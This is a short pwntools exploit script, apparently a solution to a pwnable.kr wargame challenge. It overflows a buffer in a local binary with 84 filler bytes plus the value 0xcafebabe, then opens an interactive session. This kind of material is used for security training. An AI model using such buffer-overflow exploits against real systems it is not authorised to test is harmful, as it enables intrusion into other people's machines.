from pwn import *
#c = remote("pwnable.kr", 9000)
c = process("./pwnable.kr")
c.sendline("A" * 84 + p32(0xcafebabe))
c.interactive()
